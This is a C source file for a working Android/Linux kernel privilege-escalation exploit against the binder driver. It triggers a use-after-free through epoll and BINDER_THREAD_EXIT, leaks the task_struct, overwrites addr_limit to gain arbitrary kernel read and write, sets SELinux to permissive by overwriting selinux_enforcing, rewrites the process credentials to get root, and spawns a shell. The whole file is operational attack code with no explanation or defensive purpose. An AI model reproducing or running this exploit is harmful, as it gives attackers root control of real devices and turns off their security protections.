#define _GNU_SOURCE
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <assert.h>
#include <inttypes.h>
#include <sys/types.h>
#include <stdio.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <poll.h>
#include <sched.h>
#include <sys/socket.h>

#define BINDER_THREAD_EXIT 0x40046208ul

int fd = 0, ret;
static int page_size = 0x1000;
unsigned long selinux_security = 0, selinux_enforcing = 0;
unsigned long cred = 0, task_struct = 0, kernel_leak = 0, kernel_base = 0;
unsigned long addr, condition = 0;
unsigned long j = 0, i = 0, k;
char buf[0x2000];
char *spinner;

#define IOVEC_N 20
#define ADDR_LIMIT_OFFSET 0xa18
#define PID_OFFSET 0x4e8
#define CRED_OFFSET 0x680

void bp(char *p)
{
	char a;
	printf("[*] Breakpoint: %s\n", p);
	read(0, &a, 1);
}

void hexprint(char *buffer, unsigned int bytes) // print like gdb qwords, we round to nearest dqword
{
    int dqwords = ((bytes + 0x10 - 1)&0xfffffff0) / 0x10;
    int qwords = dqwords * 2;
    for (int i = 0; i < qwords; i+=2)
    {
        if(i%64 == 0)	printf("\n");
        printf("0x%04llx: 0x%016llx 0x%016llx\n", (i * 0x8), ((size_t*)buffer)[i], ((size_t*)buffer)[i+1]);
    }
    puts("-----------------------------------------------");
    return;
}

void leak_task_struct()
{
	cpu_set_t cpu_set;
	CPU_ZERO(&cpu_set);
	CPU_SET(0,&cpu_set);
	ret = sched_setaffinity(0,sizeof(cpu_set),&cpu_set);
	assert(ret >= 0);

	int epfd;
	struct epoll_event event = { .events = EPOLLIN };

	fd = open("/dev/binder", O_RDONLY);
	printf("[+] binder fd: %d\n", fd);
	epfd = epoll_create(1000);
	printf("[+] epfd: %d\n", epfd);

	struct iovec iov_buffers[IOVEC_N] = {0};
	char read_buffer0[0x1000];
	memset(read_buffer0, 0x52, 0x1000);

	spinner = mmap(0x100000000, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	assert(((long)spinner & 0xffffffff) == 0);

	iov_buffers[0xa].iov_base = spinner;
	iov_buffers[0xa].iov_len= 0x1000;
	iov_buffers[0xb].iov_base = read_buffer0;
	iov_buffers[0xb].iov_len= 0x1000;

	int pipe_fd[2];
	ret = pipe(pipe_fd);
	assert(ret != -1);

	ret = fcntl(pipe_fd[1], F_SETPIPE_SZ, 0x1000);
	assert(ret == 0x1000);
	ret = fcntl(pipe_fd[0], F_SETPIPE_SZ, 0x1000);
	assert(ret == 0x1000);

	epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &event);
	puts("[*] Allocation done.");

	if (!fork())
	{
		puts("\t[C] Long sleep to ensure accuracy...");
		sleep(1);

		puts("\t[*] Triggering UAF");
		epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &event);
		
		puts("\t[C] Removing useless data from pipe...");
		ret = read(pipe_fd[0], buf, 0x1000);
		assert(ret == 0x1000);
		puts("\t[C] Child exits...");
		_exit(0);
	}

	puts("[*] Freeing.");
	ioctl(fd, BINDER_THREAD_EXIT, NULL);
	
	ret = writev(pipe_fd[1], iov_buffers, IOVEC_N);
	printf("[+] writev() returns: 0x%lx\n", ret);
	assert(ret == 0x2000);

	read(pipe_fd[0], buf, 0x1000);
	printf("[+] read() returns: 0x%lx\n", ret);

	task_struct = *(unsigned long *)(buf + 0xe8);
	printf("[+] task_struct found: 0x%lx\n", task_struct);
}

void overwrite_addr_limit()
{
	cpu_set_t cpu_set;
	CPU_ZERO(&cpu_set);
	CPU_SET(0,&cpu_set);
	ret = sched_setaffinity(0,sizeof(cpu_set),&cpu_set);
	assert(ret >= 0);

	int epfd;
	struct epoll_event event = { .events = EPOLLIN };

	fd = open("/dev/binder", O_RDONLY);
	printf("[+] binder fd: %d\n", fd);
	epfd = epoll_create(1000);
	printf("[+] epfd: %d\n", epfd);

	struct iovec iov_buffers[IOVEC_N] = {0};
	char read_buffer0[0x1000];
	memset(read_buffer0, 0x52, 0x1000);

	iov_buffers[0xa].iov_base = spinner;
	iov_buffers[0xa].iov_len= 0x1;
	iov_buffers[0xb].iov_base = read_buffer0;
	iov_buffers[0xb].iov_len= 0x8 * 5;
	iov_buffers[0xc].iov_base = read_buffer0;
	iov_buffers[0xc].iov_len= 0x8;

	int socket[2];
	ret = socketpair(AF_UNIX, SOCK_STREAM, 0, socket);
	assert(ret >= 0);
	
	ret = write(socket[1], "A", 1);
	assert(ret == 1);

	epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &event);
	puts("[*] Allocation done.");

	struct msghdr msg;
	msg.msg_name = NULL;
	msg.msg_namelen = 0;
	msg.msg_iov = iov_buffers;
	msg.msg_iovlen = IOVEC_N;
	msg.msg_control = NULL;
	msg.msg_controllen = 0;
	msg.msg_flags = 0;

	if (!fork())
	{
		puts("\t[C] Long sleep to ensure accuracy...");
		sleep(1);

		puts("\t[*] Triggering UAF");
		epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &event);
		
		puts("\t[C] Sending usefull data now...");
		long data1234[] = {1, 0x13371337, 0x28, task_struct + ADDR_LIMIT_OFFSET, 0x8};
		ret = write(socket[1], data1234, 0x28);
		assert(ret == 0x28);
		puts("\t[C] Sending final overwrite value...");
		data1234[0] = data1234[1] = data1234[2] = data1234[3] = 0xfffffffffffffffe;
		ret = write(socket[1], data1234, 0x8);
		assert(ret == 0x8);
		puts("\t[C] Child exits...");
		_exit(0);
	}

	puts("[*] Freeing.");
	ioctl(fd, BINDER_THREAD_EXIT, NULL);
	
	ret = recvmsg(socket[0], &msg, MSG_WAITALL);
	printf("[+] recvmsg() returns: 0x%lx\n", ret);
	assert(ret == 0x31);

	puts("[!] addr_limit overwrite done.");
}

unsigned long arb_read(unsigned long addr)
{
	int pipe_fd[2];
	ret = pipe(pipe_fd);
	assert(ret != -1);

	unsigned long data = 0;
	write(pipe_fd[1], addr, 8);
	read(pipe_fd[0], &data, 8);

	return data;
}

void arb_write(unsigned long addr, unsigned long len, unsigned long data)
{
	int pipe_fd[2];
	ret = pipe(pipe_fd);
	assert(ret != -1);

	write(pipe_fd[1], data, len);
	read(pipe_fd[0], addr, len);
}

void verifying()
{
	int pipe_fd[2];
	ret = pipe(pipe_fd);
	assert(ret != -1);

	write(pipe_fd[1], task_struct, 0x1000);
	read(pipe_fd[0], buf, 0x1000);

	assert(getpid() == *(int *)(buf + PID_OFFSET));
	puts("[!] Arbitrary rw verified with PID :D");

	cred = *(unsigned long *)(buf + CRED_OFFSET);
	printf("[+] cred: 0x%lx\n", cred);

	kernel_leak = *(unsigned long *)(buf + 0x70);
	printf("[+] kernel_leak: 0x%lx\n", kernel_leak);

	kernel_base = kernel_leak - 0xffffffff8100bf10 + 0xffffffff80200000;
	printf("[+] kernel_base: 0x%lx\n", kernel_base);
}

int main()
{
	// alarm(60);
	leak_task_struct();
	overwrite_addr_limit();
	verifying();

	selinux_enforcing = kernel_base + 0x149fe58;
	printf("[+] security_enforcing: 0x%lx\n", selinux_enforcing);

	puts("[*] Time for a little magic...");

	// Disable selinux enforcing...
	memset(buf, 0, 0x100);
	buf[4] = buf[0] = 1;
	arb_write(selinux_enforcing, 4, buf + 0x10);
	puts("[+] Selinux changed: Permissive now.");

	// escalate to root :)
	memset(buf, 0, 0x100);
	unsigned long *ptr = (unsigned long *)(buf + 0x30);
	*ptr++ = 0x0000003FFFFFFFFF;
	*ptr++ = 0x0000003FFFFFFFFF;
	*ptr++ = 0x0000003FFFFFFFFF;
	arb_write(cred + 4, 0x4c, buf + 4);
	assert(getuid() == 0);
	puts("[+] root now...");

	system("sh");
	bp("Finally exit...");
}